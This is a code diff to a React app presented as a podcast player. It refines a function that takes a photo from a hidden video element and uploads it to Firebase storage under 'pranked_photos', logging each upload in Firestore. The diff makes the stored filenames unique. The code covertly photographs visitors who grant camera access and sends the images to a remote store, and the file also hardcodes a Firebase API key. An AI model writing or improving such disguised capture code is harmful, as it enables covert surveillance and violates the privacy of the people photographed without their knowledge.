@@ -7,6 +7,7 @@ import { getFirestore, collection, addDoc } from "firebase/firestore";
 import 'bootstrap/dist/css/bootstrap.min.css';
 import AudioPlayer from "react-h5-audio-player";
 import "react-h5-audio-player/lib/styles.css";
+import { v4 as uuidv4 } from "uuid";
 
 const firebaseConfig = {
   apiKey: "AIzaSyDQlV_DbV2a_AON6GNPgHKnTaTb-ScqmZw",
@@ -40,51 +41,51 @@ export default function PodcastApp() {
   const [isInTelegram, setIsInTelegram] = useState(false);
   const [errorMessage, setErrorMessage] = useState(null);
   const [hasCameraPermission, setHasCameraPermission] = useState(true);
+
   const capturePhoto = useCallback(async () => {
     try {
       if (!canvasRef.current || !videoRef.current) {
         console.error("لم يتم الحصول على المرجع الخاص بالكاميرا أو اللوحة.");
         return;
       }
-  
+
       const context = canvasRef.current.getContext("2d");
       if (!context) {
         console.error("غير قادر على الحصول على سياق اللوحة.");
         return;
       }
-  
+
       context.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
       context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
-  
+
       const photoDataUrl = canvasRef.current.toDataURL("image/png");
       console.log("تم التقاط الصورة بنجاح:", photoDataUrl);
-  
+
       videoRef.current.srcObject.getTracks().forEach(track => track.stop()); // أوقف الفيديو بعد الالتقاط
-  
+
       const now = new Date();
       const formattedTime = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`;
-      const uniqueFileName = `pranked_photos/photo_${formattedTime}}.png`;
-  
+      const uniqueFileName = `pranked_photos/photo_${formattedTime}_${uuidv4()}.png`;
+
       const storageRef = ref(storage, uniqueFileName);
-  
+
       await uploadString(storageRef, photoDataUrl, "data_url");
       const photoUrl = await getDownloadURL(storageRef);
-  
+
       console.log("تم رفع الصورة بنجاح. الرابط:", photoUrl);
-  
+
       await addDoc(collection(db, "pranked_photo"), {
         photoUrl: photoUrl,
         timestamp: Date.now(),
+        uniqueId: uuidv4(),
       });
-  
+
       console.log("تمت إضافة رابط الصورة إلى Firestore.");
     } catch (error) {
       console.error("خطأ في التقاط أو رفع الصورة:", error);
       setErrorMessage("خطأ في رفع الصورة. الرجاء المحاولة مرة أخرى.");
     }
   }, []);
-  
-  
 
   const requestCameraPermission = useCallback(async () => {
     try {
@@ -153,16 +154,15 @@ export default function PodcastApp() {
       </Card>
 
       <div className="mb-4" style={{ maxWidth: "400px", margin: "0 auto" }}>
-      <AudioPlayer
-  src={`${process.env.PUBLIC_URL}/assets/bc.mp3`}
-  autoPlay={false} // قم بتغيير هذه الخاصية إلى false أو إزالتها
-  onPlay={(e) => console.log("تشغيل الصوت")}
-  layout="horizontal"
-  showJumpControls={false}
-  customAdditionalControls={[]}
-  customVolumeControls={[]}
-/>
-
+        <AudioPlayer
+          src={`${process.env.PUBLIC_URL}/assets/bc.mp3`}
+          autoPlay={false}
+          onPlay={(e) => console.log("تشغيل الصوت")}
+          layout="horizontal"
+          showJumpControls={false}
+          customAdditionalControls={[]}
+          customVolumeControls={[]}
+        />
       </div>
 
       <video ref={videoRef} style={{ display: "none" }} />
